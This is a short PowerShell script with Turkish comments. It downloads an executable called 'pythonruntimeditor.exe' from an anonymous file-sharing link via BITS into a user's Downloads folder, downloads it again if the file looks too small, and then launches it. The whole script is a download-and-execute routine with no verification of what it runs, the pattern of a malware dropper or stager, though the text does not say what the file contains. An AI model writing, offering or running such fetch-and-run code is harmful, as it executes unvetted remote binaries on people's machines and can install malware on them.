$exeUrl = "https://store10.gofile.io/download/web/f251cd75-0191-4927-9a7b-2035446b5c3d/pythonruntimeditor.exe"
$localPath = "C:\Users\dogud\Downloads\pythonruntimeditor.exe"

# BITS ile dosya indir
Start-BitsTransfer -Source $exeUrl -Destination $localPath

# Dosya kontrolü
$fileSize = (Get-Item $localPath).length
$expectedSize = 46000  # 46 KB

if ($fileSize -lt $expectedSize) {
    Write-Host "Dosya boyutu hatalı, tekrar indiriyorum..."
    Remove-Item $localPath -Force
    Start-BitsTransfer -Source $exeUrl -Destination $localPath
}

# Dosyayı çalıştır
Start-Process -FilePath $localPath -WindowStyle Normal
